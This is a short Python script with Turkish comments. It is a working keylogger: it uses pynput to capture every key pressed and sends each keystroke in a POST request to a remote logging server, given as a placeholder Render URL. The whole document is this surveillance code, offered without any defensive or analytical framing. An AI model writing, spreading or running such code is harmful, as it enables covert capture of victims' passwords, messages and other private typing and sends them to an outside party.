import requests
from pynput import keyboard

# Render'daki sunucu URL'si
SERVER_URL = "https://your-app.onrender.com/log"

def on_press(key):
    try:
        data = f"{key.char}"
    except AttributeError:
        data = f"[{key}]"
    # Veriyi POST isteği ile gönder
    requests.post(SERVER_URL, data=data)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
